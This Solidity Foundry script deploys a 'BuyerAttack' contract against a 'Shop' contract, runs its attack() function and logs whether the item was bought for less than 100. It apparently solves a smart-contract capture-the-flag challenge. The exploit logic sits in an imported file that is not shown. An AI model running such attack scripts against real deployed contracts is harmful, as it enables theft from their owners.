// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./BuyerAttack.sol";
import "./Shop.sol";

contract ShopAttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address shopAddress = vm.envAddress("SHOP_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // Get initial state
        Shop shop = Shop(shopAddress);
        console.log("=== INITIAL STATE ===");
        console.log("Shop price:", shop.price());
        console.log("Shop isSold:", shop.isSold());

        // Deploy attacker contract
        console.log("\n=== DEPLOYING ATTACK CONTRACT ===");
        BuyerAttack attacker = new BuyerAttack(shopAddress);
        console.log("BuyerAttack deployed at:", address(attacker));

        // Execute attack
        console.log("\n=== EXECUTING ATTACK ===");
        attacker.attack();

        // Verify results
        console.log("\n=== FINAL STATE ===");
        console.log("Shop price:", shop.price());
        console.log("Shop isSold:", shop.isSold());

        if (shop.price() < 100 && shop.isSold()) {
            console.log("\n[SUCCESS] Item purchased for less than 100!");
        } else {
            console.log("\n[FAILED] Attack did not work as expected");
        }

        vm.stopBroadcast();
    }
}
